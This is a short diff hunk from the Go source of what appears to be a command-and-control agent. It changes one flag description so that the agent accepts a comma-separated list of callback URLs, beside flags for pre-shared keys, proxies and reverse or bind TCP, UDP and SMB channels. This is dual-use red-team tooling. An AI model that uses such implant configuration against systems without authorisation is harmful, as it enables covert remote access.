@@ -108,7 +108,7 @@ func main() {
 	flag.StringVar(&auth, "auth", auth, "The Agent's authentication method (e.g, OPAQUE")
 	flag.StringVar(&addr, "addr", addr, "The address in interface:port format the agent will use for communications")
 	flag.StringVar(&transforms, "transforms", transforms, "Ordered CSV of transforms to construct a message")
-	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
+	flag.StringVar(&url, "url", url, "A comma separated list of the full URLs for the agent to connect to")
 	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
 	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), http (HTTP/1.1 Clear-Text), h2 (HTTP/2), h2c (HTTP/2 Clear-Text), http3 (QUIC or HTTP/3.0), tcp-bind, tcp-reverse, udp-bind, udp-reverse, smb-bind]")
 	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
